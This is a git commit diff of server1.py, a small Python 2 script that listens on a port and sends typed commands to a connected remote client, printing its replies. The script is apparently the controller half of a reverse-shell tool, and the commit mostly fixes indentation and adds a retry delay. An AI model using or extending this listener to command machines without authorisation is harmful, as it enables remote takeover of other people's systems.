69ae58e652f8faa04d2c4422c228dfae4e9575b3
bankslin <banks@mail>
2018-06-21 20:44:21 -0400

    changed server1

--- server1.py
+++ server1.py
@@ -1,57 +1,62 @@
 #server script
-import socket, os, sys
+import socket, os, sys, time
 def socketCreate():
     try:
-            global host
-            global port
-            global s 
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            host = ''
-            port = raw_input('Type the port for istening: ')
-            if port == '':
-                socketCreate()
-            port = int(port)
-        except socket.error as msg:
-            print ('Socket creation error: ' + str(msg[0]))
-    def socketBind():
-        try:
-            print ('Binding socket at port %s'%(port))
-            #s.bind will bind socket to the designated port
-            s.bind((host,port))
-            #s.listen will stand for maximum number of connections
-            s.listen(1)
-        except socket.error as msg:
-            print ('Socket binding error: ' + str(msg[0]))
-            print ('Retrying...')
-            #in case of exceptions, it'll retry untill binding is successful.
-            socketBind()
-    def socketAccept():
-            global Conn
-            global addr
-            global hostname
-            try:
-                conn, addr = s.accept()
-                print ('[!] Session opened at %s:%s'%(addr[0],addr[1]))
-                print ('\n')
-                #will assign variable hostname to the hostname of remote client
-                hostname = conn.recv(1024)
-                menu()
-            except socket.error as msg:
-                print ('Socket Accepting error: ' + str(msg[0]))
-                if cmd == 'quit':
-                    conn.close()
-                    s.close()
-                    sys.exit()
-                command = conn.send(cmd)
-                result = conn.recv(16834)
-                if result <> hostname:
-                    print result
-
-    def main():
+        global host
+        global port
+        global s
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        host = ''
+        port = raw_input('Type the port for listening: ')
+        if port == '':
             socketCreate()
-            socketBind()
-            socketAccept()
+        port = int(port)
+        #port = 5555
+    except socket.error as msg:
+        print ('Socket creation error: ' + str(msg[0]))
+def socketBind():
+    try:
+        print ('Binding socket at port %s'%(port))
+        #s.bind will bind socket to the designated port
+        s.bind((host,port))
+        #s.listen will stand for maximum number of connections
+        s.listen(1)
+    except socket.error as msg:
+        print ('Socket binding error: ' + str(msg[0]))
+        print ('Retrying...')
+        time.sleep(30)
+        #in case of exceptions, it'll retry untill binding is successful.
+        socketBind()
+def socketAccept():
+    global conn
+    global addr
+    global hostname
+    try:
+        conn, addr = s.accept()
+        print ('[!] Session opened at %s:%s'%(addr[0],addr[1]))
+        print ('\n')
+        #will assign variable hostname to the hostname of remote client
+        hostname = conn.recv(1024)
+        menu()
+    except socket.error as msg:
+        print ('Socket Accepting error: ' + str(msg[0]))
+def menu():
+    while 1:
+        cmd = raw_input(str(addr[0])+'@' + str(hostname) + '> ')
+        if cmd == 'quit':
+            conn.close()
+            s.close()
+            sys.exit()
+        command = conn.send(cmd)
+        result = conn.recv(16834)
+        if result <> hostname:
+            print (result)
 
-        main()
+def main():
+    socketCreate()
+    socketBind()
+    socketAccept()
+
+main()
 
 
